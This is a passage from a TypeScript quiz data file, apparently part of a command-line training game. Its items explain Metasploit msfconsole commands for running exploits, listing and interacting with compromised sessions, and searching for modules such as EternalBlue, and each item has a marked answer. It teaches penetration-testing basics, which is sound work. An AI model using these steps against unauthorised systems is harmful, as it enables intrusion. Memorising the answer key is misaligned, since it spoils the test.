    o: ["Executes the module", "Run exploit", "Execute", "Launch"],
    c: 0,
    e: "run or exploit runs the module. Handler waits. Exploit sends. Session on success.",
    de: "exploit. exploit -j for job. sessions -l for list. sessions -i 1 to interact."
  }),
  (_i: number) => ({
    q: "What does `sessions -i 1` in msfconsole do?",
    o: ["Interacts with session 1", "Session interact", "Interact", "Shell session"],
    c: 0,
    e: "sessions -i 1 attaches to session. Meterpreter or shell. Post-exploitation.",
    de: "sessions -i 1. meterpreter>. shell. migrate. Post modules."
  }),
  (_i: number) => ({
    q: "What does `back` in msfconsole do?",
    o: ["Returns to previous menu", "Back", "Previous", "Exit module"],
    c: 0,
    e: "back unloads current module. Back to msf6. Switch modules.",
    de: "back. use different exploit. Or exit to quit msfconsole."
  }),
  (_i: number) => ({
    q: "What does `search` in msfconsole do?",
    o: ["Searches modules by keyword", "Search", "Find module", "Module search"],
    c: 0,
    e: "search eternalblue. search type:exploit platform:windows. Finds matching modules.",
    de: "search smb. search cve:2017. use 0 to use first result. Narrow with filters."
  }),
];

import { level9Intermediate } from './level9_intermediate_cli';
import { level9Expert } from './level9_expert_cli';

export const level9Patterns = beginner;
export const level9IntermediateA = level9Intermediate.slice(0, 50);
export const level9IntermediateB = level9Intermediate.slice(50, 100);
export const level9ExpertA = level9Expert.slice(0, 50);
export const level9ExpertB = level9Expert.slice(50, 107);
